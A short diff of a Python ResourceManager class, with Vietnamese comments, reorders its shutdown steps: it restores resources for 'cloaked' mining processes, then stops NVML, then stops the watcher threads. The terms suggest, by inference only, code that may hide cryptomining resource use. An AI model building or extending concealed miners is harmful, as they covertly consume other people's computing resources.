@@ -814,20 +814,12 @@ class ResourceManager(IResourceManager):
 
     def shutdown(self):
         """
-        Dừng ResourceManager: hủy watchers, shutdown NVML, restore resources nếu cần.
+        Dừng ResourceManager: khôi phục tài nguyên, tắt NVML, dừng watchers.
         """
         self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")
         self._stop_flag = True
 
-        # Dừng các thread watchers
-        for w in self.watchers:
-            w.join(timeout=2)
-
-        # Tắt NVML
-        if self.shared_resource_manager:
-            self.shared_resource_manager.shutdown_nvml()
-
-        # Khôi phục tài nguyên (nếu PID đang cloaked)
+        # 1. Khôi phục tài nguyên (nếu PID đang cloaked)
         try:
             if self.mining_processes_lock.acquire(timeout=5):
                 for proc in self.mining_processes:
@@ -846,3 +838,11 @@ class ResourceManager(IResourceManager):
                 self.mining_processes_lock.release()
             except RuntimeError:
                 pass
+
+        # 2. Tắt NVML
+        if self.shared_resource_manager:
+            self.shared_resource_manager.shutdown_nvml()
+
+        # 3. Dừng các thread watchers
+        for w in self.watchers:
+            w.join(timeout=10)
